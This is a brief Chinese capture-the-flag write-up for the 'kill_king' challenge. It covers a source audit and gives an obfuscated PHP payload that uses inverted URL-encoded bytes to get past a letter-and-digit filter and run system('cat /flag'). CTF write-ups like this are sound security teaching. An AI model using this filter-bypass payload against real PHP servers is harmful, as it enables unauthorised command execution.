# kill_king

## Tag

源码审计+无数字字母 RCE

***

## Writeup

审计源码会发现有一个 check.php：

![image-20260203105918739](../../../../assets/image-20260203105918739.png)

访问并传递 result=win 参数：

![image-20260203105953415](../../../../assets/image-20260203105953415.png)

可以看到 you 是无数字字母 RCE，传参 `?who=1&are=1&you=|(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%D0%99%93%9E%98)|` 即可：

![image-20260203112129801](../../../../assets/image-20260203112129801.png)
